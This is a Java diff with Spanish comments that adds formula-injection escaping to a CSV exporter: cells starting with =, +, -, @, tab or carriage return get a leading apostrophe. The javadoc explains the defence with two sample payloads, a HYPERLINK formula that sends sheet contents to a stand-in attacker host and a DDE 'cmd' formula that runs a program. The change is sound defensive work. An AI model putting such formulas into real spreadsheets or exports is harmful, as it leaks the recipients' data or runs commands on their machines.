@@ -104,8 +104,50 @@ public class ExportadorCsv {
 		csv.append(FIN_DE_LINEA);
 	}
 
+	/**
+	 * Caracteres con los que una planilla interpreta la celda como <b>formula</b> y no como texto.
+	 *
+	 * <p>Los cuatro de siempre mas el tabulador y el retorno de carro, que Excel tambien usa como
+	 * arranque de formula cuando la celda se pega desde el portapapeles.
+	 */
+	private static final String ARRANQUES_DE_FORMULA = "=+-@\t\r";
+
+	/**
+	 * Escapa la celda para CSV <b>y</b> para la planilla que la va a abrir. No son lo mismo.
+	 *
+	 * <h2>Las comillas no alcanzan</h2>
+	 *
+	 * <p>El entrecomillado de RFC 4180 resuelve el parseo —separadores, comillas y saltos de
+	 * linea dentro del valor— y <b>no evita que Excel y LibreOffice evaluen</b> una celda que
+	 * empieza con {@code =}, {@code +}, {@code -} o {@code @}. Una celda
+	 * {@code =HYPERLINK("http://atacante/?"&A1,"Click")} filtra el contenido de la planilla al
+	 * abrirla, y {@code =cmd|'/c calc'!A1} ejecuta en las versiones que todavia honran DDE. El
+	 * archivo se sirve con {@code Content-Disposition: attachment} y el javadoc de esta clase ya
+	 * dice cual es su destino: llega por mail y se abre en una planilla.
+	 *
+	 * <h2>Por que se agrega si hoy no es explotable</h2>
+	 *
+	 * <p>Porque hoy no lo es <b>por accidente</b>: ninguna celda que llega al CSV es texto libre
+	 * del usuario —son fechas, enums de la base, ids y {@code BigDecimal}, y los titulos son
+	 * constantes—. Pero {@code FilaDeReporte} no valida nada y el SPI invita explicitamente a que
+	 * cada modulo aporte su seccion: la primera fila con un nombre de financiador, un concepto o
+	 * un motivo —todos texto libre del tenant— convierte el export en un vector sin que nadie
+	 * toque esta clase. La proteccion va donde se escribe la celda, que es el unico lugar por el
+	 * que pasan todas.
+	 *
+	 * <h2>Por que apostrofo y no borrar el caracter</h2>
+	 *
+	 * <p>Un apostrofo inicial es la convencion que las planillas entienden como "esto es texto":
+	 * el valor se ve completo y no se pierde informacion, que es lo que si pasaria recortando el
+	 * primer caracter. Un importe negativo como {@code -1500,00} sigue leyendose; deja de ser un
+	 * numero para la planilla, y eso es el precio, asumido: los importes del reporte salen de
+	 * {@code toPlainString()} y el consumidor es una persona leyendo, no una hoja de calculo.
+	 */
 	private static String escapar(String celda) {
 		String valor = celda == null ? "" : celda;
+		if (!valor.isEmpty() && ARRANQUES_DE_FORMULA.indexOf(valor.charAt(0)) >= 0) {
+			valor = "'" + valor;
+		}
 		return '"' + valor.replace("\"", "\"\"") + '"';
 	}
 }
